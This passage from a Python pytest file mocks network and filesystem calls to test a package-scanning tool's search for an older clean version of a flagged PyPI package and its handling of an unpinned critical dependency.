    monkeypatch.setattr(sp, "fetch_pypi_versions", lambda name: ["0.9.0", "1.0.0"])
    monkeypatch.setattr(
        sp,
        "download_packages",
        lambda specs, dest, **kw: ([("foo==0.9.0", "/tmp/foo-0.9.0.whl")], []),
    )
    monkeypatch.setattr(sp, "scan_archive", lambda archive_path, name: [])  # clean
    monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
    monkeypatch.setattr(sp.os, "remove", lambda *a, **k: None)
    monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)

    # bad_ver 1.0.0 -> the only older candidate is 0.9.0, which is clean.
    result = sp.find_safe_version("foo", "1.0.0", "/tmp/ignored", max_search = 10)
    assert result == "0.9.0"


def test_run_fix_uses_first_archive_path(monkeypatch):
    monkeypatch.setattr(
        sp,
        "download_packages",
        lambda specs, dest, **kw: ([("foo", "/tmp/foo-1.2.3.whl")], []),
    )
    seen = {}

    def fake_get_downloaded_version(path):
        seen["path"] = path
        return "1.2.3"

    monkeypatch.setattr(sp, "get_downloaded_version", fake_get_downloaded_version)
    monkeypatch.setattr(sp, "find_safe_version", lambda *a, **k: None)
    monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
    monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)

    # CRITICAL package with no pinned version -> must download to resolve it,
    # reaching downloaded[0][1] (the first archive's path).
    entries = [
        {
            "name": "foo",
            "is_git": False,
            "spec": "foo",
            "source_file": None,
            "raw_line": "foo",
            "line_num": 1,
        }
    ]
    sp._run_fix({"foo"}, entries, max_search = 10)  # must not raise

    assert seen.get("path") == "/tmp/foo-1.2.3.whl"
